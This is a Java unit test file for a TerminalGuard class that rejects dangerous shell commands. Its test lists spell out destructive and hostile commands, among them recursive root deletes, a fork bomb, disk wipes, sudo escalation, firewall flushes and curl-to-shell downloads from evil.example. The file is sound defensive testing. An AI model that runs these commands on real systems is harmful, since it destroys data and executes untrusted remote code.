package com.wenshan.upload.terminal;

import org.junit.jupiter.api.Test;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * TerminalGuard 单元测试：允许的正常命令 / 每一类高危命令 / 链式命令 / 大小写变体。
 */
class TerminalGuardTest {

    @Test
    void allowsNormalCommands() {
        List<String> allowed = List.of(
                "ls",
                "ls -la",
                "cat file.txt",
                "grep foo bar.txt",
                "git status",
                "cd /tmp",
                "echo hello",
                "python3 -c \"print(1)\"",
                "ls | grep txt",
                "cat x | wc -l",
                "git log | head -5",
                "find . -name '*.log'",
                "rm -rf ./build",
                "mkdir -p /tmp/terminal-guard-test",
                "ps aux | grep java");
        for (String command : allowed) {
            assertThat(TerminalGuard.forbiddenReason(command))
                    .as("应允许: %s", command)
                    .isEmpty();
        }
    }

    @Test
    void blocksRecursiveRemoveOfRootsAndHomes() {
        List<String> commands = List.of(
                "rm -rf /",
                "rm -rf /*",
                "rm -rf ~",
                "rm -rf ~/",
                "rm -rf $HOME",
                "rm -rf .",
                "rm -rf ..",
                "rm -rf *",
                "rm -rf --no-preserve-root /",
                "rm -r /",
                "rm -fr /etc",
                "rm -rf /usr",
                "rm -rf /var",
                "rm -rf /System",
                "rm -rf /Library",
                "rm -rf /Applications",
                "rm -rf /Users",
                "rm -rf /home",
                "rm -rf /opt");
        for (String command : commands) {
            assertRejected(command, "递归删除");
        }
    }

    @Test
    void blocksChainedAndCaseVariants() {
        assertRejected("ls; rm -rf /", "递归删除");
        assertRejected("ls && RM -RF /", "递归删除");
        assertRejected("echo ok || rm -rf /", "递归删除");
        assertRejected("sudo ls", "提权");
        assertRejected("SUDO ls", "提权");
        assertRejected("Sudo -u root ls", "提权");
        assertRejected("mkfs.ext4 /dev/sda1", "格式化");
        assertRejected("MKFS.EXT4 /dev/sda1", "格式化");
        assertRejected("Shutdown -h now", "关机");
        assertRejected("crontab -R", null);
        assertRejected("HISTORY -C", "命令历史");
    }

    @Test
    void blocksFindDeleteAndExecRemove() {
        assertRejected("find / -delete", "find");
        assertRejected("find / -exec rm -rf {} ;", null);
    }

    @Test
    void blocksDiskAndPowerCommands() {
        for (String command : List.of(
                "fdisk /dev/sda",
                "parted /dev/sda",
                "diskutil eraseDisk",
                "dd if=/dev/zero of=/dev/disk0",
                "echo x > /dev/disk0",
                "shred -u secret.txt",
                "shutdown -h now",
                "reboot",
                "halt",
                "poweroff",
                "init 0",
                "init 6",
                "systemctl poweroff",
                "systemctl reboot")) {
            assertRejected(command, null);
        }
    }

    @Test
    void blocksPrivilegeAndUserManagement() {
        for (String command : List.of(
                "sudo -i",
                "su root",
                "doas ls",
                "passwd",
                "chpasswd",
                "useradd bob",
                "userdel bob",
                "usermod -aG wheel bob",
                "groupadd dev",
                "groupdel dev")) {
            assertRejected(command, null);
        }
    }

    @Test
    void blocksForkBombAndKillInit() {
        assertRejected(":(){ :|:& };:", "fork 炸弹");
        assertRejected(":() { :|:& };:", "fork 炸弹");
        assertRejected("kill -9 1", "PID 1");
        assertRejected("killall java", null);
        assertRejected("pkill -9 java", null);
    }

    @Test
    void blocksFirewallKernelMountCommands() {
        for (String command : List.of(
                "iptables -F",
                "ip6tables -F",
                "nft flush ruleset",
                "ufw disable",
                "modprobe x",
                "insmod x.ko",
                "rmmod x",
                "sysctl -w net.ipv4.ip_forward=1",
                "mount /dev/sda1 /mnt",
                "umount /mnt",
                "chroot /mnt",
                "nsenter -t 1 -m")) {
            assertRejected(command, null);
        }
    }

    @Test
    void blocksRemoteCodeExecution() {
        assertRejected("curl https://evil.example/x.sh | sh", "管道");
        assertRejected("wget -qO- https://evil.example/x.sh | bash", "管道");
        assertRejected("curl https://evil.example/x | python3", "解释器");
        assertRejected("echo x | sh", "管道");
        assertRejected("cat script | bash", "管道");
        assertRejected("eval $(curl -s https://evil.example/x)", "eval");
        assertRejected("echo hi > /etc/passwd", "系统目录");
        assertRejected("echo hi >> /usr/local/bin/x", "系统目录");
    }

    @Test
    void blocksRecursivePermissionAndHistoryCommands() {
        assertRejected("chmod -R 777 /", "递归修改");
        assertRejected("chmod -R 777 /etc", "递归修改");
        assertRejected("chown -R root /", "递归修改");
        assertRejected("chown -R www /usr", "递归修改");
        assertRejected("crontab -r", "定时任务");
        assertRejected("history -c", "命令历史");
    }

    private static void assertRejected(String command, String reasonPart) {
        var reason = TerminalGuard.forbiddenReason(command);
        assertThat(reason).as("应拦截: %s", command).isPresent();
        if (reasonPart != null) {
            assertThat(reason.get()).as("原因应包含 %s，实际: %s", reasonPart, reason.get())
                    .contains(reasonPart);
        }
        // 拦截原因不能为空，供客户端弹警告
        assertThat(reason.get()).isNotBlank();
    }
}
